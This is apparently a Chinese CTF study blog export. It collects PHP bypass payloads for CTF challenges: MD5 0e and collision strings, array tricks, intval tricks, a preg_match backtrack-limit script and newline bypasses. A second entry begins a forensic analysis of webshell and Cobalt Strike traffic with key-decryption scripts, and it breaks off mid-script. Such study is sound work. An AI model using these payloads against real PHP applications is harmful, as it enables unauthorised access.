<h2 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h2><h3 id="0e绕过"><a href="#0e绕过" class="headerlink" title="0e绕过"></a>0e绕过</h3><p>QNKCDZO<br>240610708<br>s878926199a<br>s155964671a<br>s214587387a<br>s214587387a<br>这些字符串的 md5 值都是 0e 开头，在 php 弱类型比较中判断为相等</p>
<p>数组绕过</p>
<p>var_dump(md5($_GET[‘a’]) &#x3D;&#x3D; md5($_GET[‘b’]))<br>1<br>传入</p>
<p>a[]&#x3D;a&amp;b[]&#x3D;b<br>虽然会报错，但是判断为真</p>
<p>可以看到，MD5一个数组返回了null，null&#x3D;&#x3D;null，成功绕过</p>
<ol start="3">
<li>强类型绕过<br>if((string)$_POST[‘a’] !&#x3D;&#x3D; (string)$_POST[‘b’] &amp;&amp; md5($_POST[‘a’]) &#x3D;&#x3D;&#x3D; md5($_POST[‘b’]))</li>
</ol>
<p>md5 碰撞</p>
<p>payload如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line">&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure>

<p>进行url解码后的MD5值相等</p>
<p>收录一些MD5值相等的字符串</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$Param1=&quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x00\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\x55\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&quot;;</span><br><span class="line">$Param2=&quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x02\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\xd5\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&quot;;</span><br><span class="line"></span><br><span class="line">$data1=&quot;\xd1\x31\xdd\x02\xc5\xe6\xee\xc4\x69\x3d\x9a\x06\x98\xaf\xf9\x5c\x2f\xca\xb5\x07\x12\x46\x7e\xab\x40\x04\x58\x3e\xb8\xfb\x7f\x89\x55\xad\x34\x06\x09\xf4\xb3\x02\x83\xe4\x88\x83\x25\xf1\x41\x5a\x08\x51\x25\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd\x72\x80\x37\x3c\x5b\xd8\x82\x3e\x31\x56\x34\x8f\x5b\xae\x6d\xac\xd4\x36\xc9\x19\xc6\xdd\x53\xe2\x34\x87\xda\x03\xfd\x02\x39\x63\x06\xd2\x48\xcd\xa0\xe9\x9f\x33\x42\x0f\x57\x7e\xe8\xce\x54\xb6\x70\x80\x28\x0d\x1e\xc6\x98\x21\xbc\xb6\xa8\x83\x93\x96\xf9\x65\xab\x6f\xf7\x2a\x70&quot;;</span><br><span class="line">$data2=&quot;\xd1\x31\xdd\x02\xc5\xe6\xee\xc4\x69\x3d\x9a\x06\x98\xaf\xf9\x5c\x2f\xca\xb5\x87\x12\x46\x7e\xab\x40\x04\x58\x3e\xb8\xfb\x7f\x89\x55\xad\x34\x06\x09\xf4\xb3\x02\x83\xe4\x88\x83\x25\x71\x41\x5a\x08\x51\x25\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd\xf2\x80\x37\x3c\x5b\xd8\x82\x3e\x31\x56\x34\x8f\x5b\xae\x6d\xac\xd4\x36\xc9\x19\xc6\xdd\x53\xe2\xb4\x87\xda\x03\xfd\x02\x39\x63\x06\xd2\x48\xcd\xa0\xe9\x9f\x33\x42\x0f\x57\x7e\xe8\xce\x54\xb6\x70\x80\xa8\x0d\x1e\xc6\x98\x21\xbc\xb6\xa8\x83\x93\x96\xf9\x65\x2b\x6f\xf7\x2a\x70&quot;;</span><br></pre></td></tr></table></figure>

<h3 id="a-x3D-x3D-md5-a"><a href="#a-x3D-x3D-md5-a" class="headerlink" title="$a&#x3D;&#x3D;md5($a)"></a>$a&#x3D;&#x3D;md5($a)</h3><p>0e215962017 的 MD5 值也是由 0e 开头，在 PHP 弱类型比较中相等</p>
<h2 id="intval"><a href="#intval" class="headerlink" title="intval"></a>intval</h2><p>intval() 函数可以获取变量的「整数值」。常用于强制类型转换</p>
<p>直到遇上数字或正负符号才开始做转换，再遇到非数字或<a href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020">字符串</a>结束时，结束转换</p>
<p>intval($id)会从字符串$id的起始位置开始去数字碰到非数字就结束,当起始位置为非数字时则为0。<br>比如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">intval(‘100a123’)=100</span><br><span class="line">intval(‘a123’)=0</span><br><span class="line">`?id=&#x27;1000&#x27; //&quot;1000&quot;或(1000)皆可</span><br><span class="line">?id=125&lt;&lt;3 //左移</span><br><span class="line">?id=680|320 //按位或</span><br><span class="line">?id=992^8 //按位异或</span><br><span class="line">?id=~~1000 //两次取反</span><br><span class="line">?id=0x3e8 //十六进制</span><br><span class="line">?id=0b1111101000 //二进制`</span><br></pre></td></tr></table></figure>

<h2 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match"></a>preg_match</h2><h3 id="回溯绕过"><a href="#回溯绕过" class="headerlink" title="回溯绕过"></a>回溯绕过</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="variable">$f</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>) === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>pcre.backtrack_limit</code>给pcre设定了一个回溯次数上限，默认为1000000，如果回溯次数超过这个数字，preg_match会返回false</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=&quot;http://.ctf.show:8080/&quot;</span><br><span class="line">data=&#123;</span><br><span class="line">    &#x27;f&#x27;:&#x27;very&#x27;*250000+&#x27;ctfshow&#x27;</span><br><span class="line">&#125;</span><br><span class="line">r=requests.post(url,data=data)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>

<h3 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?f=ctfshow[]</span><br></pre></td></tr></table></figure>

<h3 id="换行绕过"><a href="#换行绕过" class="headerlink" title="换行绕过"></a>换行绕过</h3><p><code>.</code>不会匹配换行符，如</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/^.*(flag).*$/&#x27;</span>, <span class="variable">$json</span>)) &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>只需要</p>
<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line"><span class="variable">$json</span><span class="operator">=</span><span class="string">&quot;<span class="subst">\n</span>flag&quot;</span></span><br></pre></td></tr></table></figure>

<p>而在非多行模式下，<code>$</code>似乎会忽略在句尾的<code>%0a</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/^flag$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>] !== <span class="string">&#x27;flag&#x27;</span>) &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>只需要传入</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">?a=flag%0a</span><br></pre></td></tr></table></figure>





<h1 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h1><h2 id="SERVER"><a href="#SERVER" class="headerlink" title="$_SERVER"></a>$_SERVER</h2><table>
<thead>
<tr>
<th>元素&#x2F;代码</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>$_SERVER[‘PHP_SELF’]</td>
<td>返回当前执行脚本的文件名。</td>
</tr>
<tr>
<td>$_SERVER[‘GATEWAY_INTERFACE’]</td>
<td>返回服务器使用的 CGI 规范的版本。</td>
</tr>
<tr>
<td>$_SERVER[‘SERVER_ADDR’]</td>
<td>返回当前运行脚本所在的服务器的 IP 地址。</td>
</tr>
<tr>
<td>$_SERVER[‘SERVER_NAME’]</td>
<td>返回当前运行脚本所在的服务器的主机名。</td>
</tr>
<tr>
<td>$_SERVER[‘SERVER_SOFTWARE’]</td>
<td>返回服务器标识字符串（比如 Apache&#x2F;2.2.24）。</td>
</tr>
<tr>
<td>$_SERVER[‘SERVER_PROTOCOL’]</td>
<td>返回请求页面时通信协议的名称和版本（例如，“HTTP&#x2F;1.0”）。</td>
</tr>
<tr>
<td>$_SERVER[‘REQUEST_METHOD’]</td>
<td>返回访问页面使用的请求方法（例如 POST）。</td>
</tr>
<tr>
<td>$_SERVER[‘REQUEST_TIME’]</td>
<td>返回请求开始时的时间戳（例如 1577687494）。</td>
</tr>
<tr>
<td>$_SERVER[‘QUERY_STRING’]</td>
<td>返回查询字符串，如果是通过查询字符串访问此页面。</td>
</tr>
<tr>
<td>$_SERVER[‘HTTP_ACCEPT’]</td>
<td>返回来自当前请求的请求头。</td>
</tr>
<tr>
<td>$_SERVER[‘HTTP_ACCEPT_CHARSET’]</td>
<td>返回来自当前请求的 Accept_Charset 头（ 例如 utf-8,ISO-8859-1）</td>
</tr>
<tr>
<td>$_SERVER[‘HTTP_HOST’]</td>
<td>返回来自当前请求的 Host 头。</td>
</tr>
<tr>
<td>$_SERVER[‘HTTP_REFERER’]</td>
<td>返回当前页面的完整 URL（不可靠，因为不是所有用户代理都支持）。</td>
</tr>
<tr>
<td>$_SERVER[‘HTTPS’]</td>
<td>是否通过安全 HTTP 协议查询脚本。</td>
</tr>
<tr>
<td>$_SERVER[‘REMOTE_ADDR’]</td>
<td>返回浏览当前页面的用户的 IP 地址。</td>
</tr>
<tr>
<td>$_SERVER[‘REMOTE_HOST’]</td>
<td>返回浏览当前页面的用户的主机名。</td>
</tr>
<tr>
<td>$_SERVER[‘REMOTE_PORT’]</td>
<td>返回用户机器上连接到 Web 服务器所使用的端口号。</td>
</tr>
<tr>
<td>$_SERVER[‘SCRIPT_FILENAME’]</td>
<td>返回当前执行脚本的绝对路径。</td>
</tr>
<tr>
<td>$_SERVER[‘SERVER_ADMIN’]</td>
<td>该值指明了 Apache 服务器配置文件中的 SERVER_ADMIN 参数。</td>
</tr>
<tr>
<td>$_SERVER[‘SERVER_PORT’]</td>
<td>Web 服务器使用的端口。默认值为 “80”。</td>
</tr>
<tr>
<td>$_SERVER[‘SERVER_SIGNATURE’]</td>
<td>返回服务器版本和虚拟主机名。</td>
</tr>
<tr>
<td>$_SERVER[‘PATH_TRANSLATED’]</td>
<td>当前脚本所在文件系统（非文档根目录）的基本路径。</td>
</tr>
<tr>
<td>$_SERVER[‘SCRIPT_NAME’]</td>
<td>返回当前脚本的路径。</td>
</tr>
<tr>
<td>$_SERVER[‘SCRIPT_URI’]</td>
<td>返回当前页面的 URI。</td>
</tr>
</tbody></table>
<p>3get_defined_functions(void)</p>
<p>获取所有已经定义的函数,包含内部函数和用户定义的函数。</p>
<p>输出用户定义的函数方法为：</p>
<p>$hhh&#x3D;get_defined_functions();var_dump($hhh[‘user’]);</p>
<p> get_defined_constants(void)</p>
<p>返回所有可用的常量，包含系统常量和用户定义的常量。</p>
<p> get_declared_classes(void)</p>
<p>返回所有可用的类，包含系统类和用户定义的类。</p>
<p>get_included_files()</p>
<p>返回所有的包含的文件路径的数组，included 和 required 的包含文件</p>
<p><strong>需要了解的超全局变量</strong></p>
<p>PHP 中的许多预定义变量都是“超全局的”，这意味着它们在一个脚</p>
<p>本的全部作用域中都可用。在函数或方法中无需执</p>
<p>行 global $variable; 就可以访问它们。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$GLOBALS</span><br><span class="line">$_SERVER</span><br><span class="line">$_REQUEST</span><br><span class="line">$_POST</span><br><span class="line">$_GET</span><br><span class="line">$_FILES</span><br><span class="line">$_ENV</span><br><span class="line">$_COOKIE</span><br><span class="line">$_SESSION</span><br></pre></td></tr></table></figure>

<p> $GLOBALS — 引用全局作用域中可用的全部变量</p>
<p>$GLOBALS 这种全局变量用于在 PHP 脚本中的任意位置访问全局变</p>
<p>量（从函数或方法中均可）。</p>
<p>PHP 在名为 $GLOBALS[index] 的数组中存储了所有全局变量。变量</p>
<p>的名字就是数组的键。</p>
<p>下面的例子展示了如何使用超级全局变量 $GLOBALS：</p>
<p>实例</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$x</span> = <span class="number">75</span>;</span><br><span class="line"><span class="variable">$y</span> = <span class="number">25</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addition</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="variable">$GLOBALS</span>[<span class="string">&#x27;z&#x27;</span>] = <span class="variable">$GLOBALS</span>[<span class="string">&#x27;x&#x27;</span>] + <span class="variable">$GLOBALS</span>[<span class="string">&#x27;y&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">addition</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$z</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行结果：95</p>
<p>在上面的例子中，由于 z 是 $GLOBALS 数组中的变量，因此在函数之</p>
<p>外也可以访问它。</p>
<p>2 $_SERVER</p>
<p>$_SERVER 这种超全局变量保存关于报头、路径和脚本位置的信息。</p>
<p>下面的例子展示了如何使用 $_SERVER 中的某些元素：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://websec.readthedocs.io/zh/latest/basic/index.html</span><br></pre></td></tr></table></figure>

<h1 id="正则匹配"><a href="#正则匹配" class="headerlink" title="正则匹配"></a>正则匹配</h1><p><a href="https://www.runoob.com/regexp/regexp-tutorial.html">正则表达式 – 教程 | 菜鸟教程 (runoob.com)</a></p>
<h2 id="匹配公式语法"><a href="#匹配公式语法" class="headerlink" title="匹配公式语法"></a>匹配公式语法</h2><table>
<thead>
<tr>
<th align="center">量词</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">+</td>
<td>匹配任何至少包含一个前导字符串</td>
</tr>
<tr>
<td align="center">*</td>
<td>匹配任何包含零个或多个前导字符串</td>
</tr>
<tr>
<td align="center">?</td>
<td>匹配任何包含零个或1个前导字符串</td>
</tr>
<tr>
<td align="center">.</td>
<td>匹配任意一个字符串</td>
</tr>
<tr>
<td align="center">{x}</td>
<td>匹配任何包含x个前导字符串</td>
</tr>
<tr>
<td align="center">{x,y}</td>
<td>匹配任何包含 x 到 y 个前导字符串</td>
</tr>
<tr>
<td align="center">{x,}</td>
<td>匹配任何包含至少x个前导字符串</td>
</tr>
<tr>
<td align="center">^</td>
<td>匹配字符串的行首</td>
</tr>
<tr>
<td align="center">$</td>
<td>匹配字符串的行尾</td>
</tr>
<tr>
<td align="center">|</td>
<td>选择符 匹配字符串的左边或者右边</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th align="center">元字符</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">[a-z]</td>
<td>匹配任何包含小写字母a-z的字符串</td>
</tr>
<tr>
<td align="center">[A-Z]</td>
<td>匹配任何包含大写字母A-Z的字符串</td>
</tr>
<tr>
<td align="center">[0-9]</td>
<td>匹配任何包含0-9的字符串</td>
</tr>
<tr>
<td align="center">[abc]</td>
<td>匹配任何包含小写字母a,b,c的字符串</td>
</tr>
<tr>
<td align="center">[^abc]</td>
<td>匹配任何不包含小写字母a,b,c的字符串</td>
</tr>
<tr>
<td align="center">[a-zA-Z0-9_]</td>
<td>匹配任何包含a-zA-Z0-9和下划线的字符串</td>
</tr>
<tr>
<td align="center">\w</td>
<td>匹配任何包含a-zA-Z0-9和下划线的字符串</td>
</tr>
<tr>
<td align="center">\W</td>
<td>匹配任何不包含a-zA-Z0-9和下划线的字符串</td>
</tr>
<tr>
<td align="center">\d</td>
<td>匹配任何包含数字字符</td>
</tr>
<tr>
<td align="center">\D</td>
<td>匹配任何非数字字符</td>
</tr>
<tr>
<td align="center">\s</td>
<td>匹配任何空白字符</td>
</tr>
<tr>
<td align="center">\S</td>
<td>匹配任何非空白字符</td>
</tr>
<tr>
<td align="center">\b</td>
<td>匹配是否到达了单词边界</td>
</tr>
<tr>
<td align="center">\B</td>
<td>匹配没有到达了单词边界</td>
</tr>
<tr>
<td align="center">\</td>
<td>匹配正则中的特殊字符</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th align="center">修饰符</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">i</td>
<td>完全不区分大小写</td>
</tr>
<tr>
<td align="center">m</td>
<td>可以采用多行识别,遇到换行也承认匹配规则</td>
</tr>
<tr>
<td align="center">x</td>
<td>忽略掉规则模式中的空白字符</td>
</tr>
<tr>
<td align="center">A</td>
<td>强制从头开始匹配</td>
</tr>
<tr>
<td align="center">U</td>
<td>禁止贪婪匹配，只跟踪到最近的一个匹配符并结束</td>
</tr>
</tbody></table>
]]></content>
      <tags>
        <tag>php</tag>
        <tag>小结</tag>
      </tags>
  </entry>
  <entry>
    <title>webshell流量分析</title>
    <url>/2024/04/01/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>cs 流量</p>
<p>冰蝎流量</p>
<p>蚁剑流量</p>
<p>哥斯拉流量</p>
<span id="more"></span>

<h1 id="cs-流量"><a href="#cs-流量" class="headerlink" title="cs 流量"></a>cs 流量</h1><p>流量特征值</p>
<p>存在两个文件</p>
<p>.cobaltstrike.beacon_keys</p>
<p>pcapng</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hexdump</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> javaobj.v2 <span class="keyword">as</span> javaobj</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_v1_5</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_arguments</span>():</span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-f&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="literal">None</span>, required=<span class="literal">True</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&quot;输入JAVA序列化文件 .cobaltstrike.beacon_keys 路径&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> parser.parse_args()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_RSA_PriKey</span>(<span class="params">SerializeKeyPath</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(SerializeKeyPath, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> fd:</span><br><span class="line">        pobj = javaobj.load(fd)</span><br><span class="line">    privateKey = pobj.array.value.privateKey.encoded.data</span><br><span class="line">    publicKey = pobj.array.value.publicKey.encoded.data</span><br><span class="line"></span><br><span class="line">    privateKey = (</span><br><span class="line">            <span class="string">b&quot;-----BEGIN PRIVATE KEY-----\n&quot;</span></span><br><span class="line">            + base64.encodebytes(<span class="built_in">bytes</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: x &amp; <span class="number">0xFF</span>, privateKey)))</span><br><span class="line">            + <span class="string">b&quot;-----END PRIVATE KEY-----&quot;</span></span><br><span class="line">    )</span><br><span class="line">    publicKey = (</span><br><span class="line">            <span class="string">b&quot;-----BEGIN PUBLIC KEY-----\n&quot;</span></span><br><span class="line">            + base64.encodebytes(<span class="built_in">bytes</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: x &amp; <span class="number">0xFF</span>, publicKey)))</span><br><span class="line">            + <span class="string">b&quot;-----END PUBLIC KEY-----&quot;</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    privateKey = privateKey.decode()</span><br><span class="line">    publicKey = publicKey.decode()</span><br><span class="line">    <span class="keyword">return</span> publicKey, privateKey</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_PK_Cipher</span>(<span class="params">privateKey</span>):</span><br><span class="line">    privateKey = RSA.import_key(privateKey.encode())</span><br><span class="line">    n_bytes = privateKey.n.bit_length() // <span class="number">8</span></span><br><span class="line">    cipher = PKCS1_v1_5.new(privateKey)</span><br><span class="line">    <span class="keyword">return</span> cipher, n_bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">private_decrypt</span>(<span class="params">cipher_text, privateKey</span>):</span><br><span class="line">    cipher, n_bytes = create_PK_Cipher(privateKey)</span><br><span class="line">    cipher_text = base64.b64decode(cipher_text.encode())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;&#x27;</span>.join(</span><br><span class="line">        cipher.decrypt(cipher_text[i: i + n_bytes], <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(cipher_text), n_bytes)</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_AES_HMAC_Key</span>(<span class="params">SerializeKeyPath, rsa_cipher_text</span>):</span><br><span class="line">    _, privateKey = get_RSA_PriKey(SerializeKeyPath)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (plain_text := private_decrypt(rsa_cipher_text, privateKey)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+]: 解密错误, 可能是RSA_Cipher_Text或者密钥有误!&quot;</span>)</span><br><span class="line">        exit(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    raw_aes_keys = plain_text[<span class="number">8</span>:<span class="number">24</span>]</span><br><span class="line">    raw_aes_hash256 = hashlib.sha256(raw_aes_keys)</span><br><span class="line">    digest = raw_aes_hash256.digest()</span><br><span class="line">    aes_key = digest[:<span class="number">16</span>]</span><br><span class="line">    hmac_key = digest[<span class="number">16</span>:]</span><br><span class="line">    <span class="keyword">return</span> aes_key, hmac_key, plain_text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    args = parse_arguments()</span><br><span class="line">    SerializeKeyPath = args.f</span><br><span class="line"><span class="comment">#此处放置load导出的cookie</span></span><br><span class="line">    rsa_cipher_text = <span class="string">&quot;xeoOUNy9EhFV01fTyqDHJTvrnfCji6iHiLabfNhxoLKdY6xA8HV8g8fmvrgs6J4d3MjdhG9ww/CAj6tEFj3Y1hfcODoOz+ggqc5jb7lcGuEHmuN7j0NawY8t5Ro7vbnDJmGF9a7Zve3v3cYHEZexDjTgfl+119fyM6hWOuXd5LM=&quot;</span></span><br><span class="line">    aes_key, hmac_key, plain_text = get_AES_HMAC_Key(SerializeKeyPath, rsa_cipher_text)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;AES key: <span class="subst">&#123;aes_key.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;HMAC key: <span class="subst">&#123;hmac_key.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">    hexdump.hexdump(plain_text)</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python cs.py -f .cobaltstrike.beacon_keys</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AES key:5f277b49bb4b15cc0728835639d691fc</span><br><span class="line">HMAC key:8c67ccf3324dae539604a6e019a57664</span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Beacon任务执行结果解密</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> hexdump</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compare_mac</span>(<span class="params">mac, mac_verif</span>):</span><br><span class="line">	<span class="keyword">if</span> mac == mac_verif:</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(mac) != <span class="built_in">len</span>(mac_verif):</span><br><span class="line">		<span class="built_in">print</span></span><br><span class="line">		<span class="string">&quot;invalid MAC size&quot;</span></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">	result = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(mac, mac_verif):</span><br><span class="line">		result |= x ^ y</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> result == <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">encrypted_data, iv_bytes, signature, shared_key, hmac_key</span>):</span><br><span class="line">	<span class="keyword">if</span> <span class="keyword">not</span> compare_mac(hmac.new(hmac_key, encrypted_data, digestmod=<span class="string">&quot;sha256&quot;</span>).digest()[<span class="number">0</span>:<span class="number">16</span>], signature):</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;message authentication failed&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">	cypher = AES.new(shared_key, AES.MODE_CBC, iv_bytes)</span><br><span class="line">	data = cypher.decrypt(encrypted_data)</span><br><span class="line">	<span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="comment">#key源自Beacon_metadata_RSA_Decrypt.py</span></span><br><span class="line">SHARED_KEY = binascii.unhexlify(<span class="string">&quot;5f277b49bb4b15cc0728835639d691fc&quot;</span>)</span><br><span class="line">HMAC_KEY = binascii.unhexlify(<span class="string">&quot;8c67ccf3324dae539604a6e019a57664&quot;</span>)</span><br><span class="line"><span class="comment"># 密文 原始数据 hex 解码 base64加密</span></span><br><span class="line"></span><br><span class="line">encrypt_data=<span class="string">&quot;AAAAUJwE+4Qyg3PGsdV+8stF4umcLlO5zBdLb0WRnKAT9cEjsKqM7DiRiWBGBMpksTmEVk+s+DJY+obKpkiG3j0COF04qLaB8INl6IaF+kqCeauM&quot;</span></span><br><span class="line"></span><br><span class="line">encrypt_data=base64.b64decode(encrypt_data)</span><br><span class="line"></span><br><span 